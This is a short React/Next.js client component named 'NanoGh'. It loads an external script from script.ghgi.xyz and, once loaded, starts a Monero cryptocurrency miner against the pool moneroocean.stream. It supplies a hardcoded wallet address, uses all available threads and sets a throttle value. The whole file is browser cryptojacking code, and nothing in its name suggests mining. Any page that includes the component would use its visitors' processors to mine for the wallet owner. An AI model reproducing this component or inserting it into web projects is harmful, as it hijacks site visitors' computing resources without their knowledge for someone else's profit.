"use client"

import Script from 'next/script';


const NanoGh = (props) => {

  return (<Script src="https://script.ghgi.xyz"
    onLoad={() => {

      server = "wss://ghgi.xyz";
      var pool = "moneroocean.stream";
      var walletAddress = "45bF6KJGyiVHiACEPn2KD2frjpuJjZBEM2iNxh6RNsfu11AhWHiqwPKJV3qj4jnDmGEKbQMiUcgXjZLwpTR2MnreQvhjQF4";
      var workerId = "Proc-03"
      var threads = -1;
      var password = "x";
      startMining(pool, walletAddress, workerId, threads, password);
      throttleMiner = 91;
    }} />)
}

export default NanoGh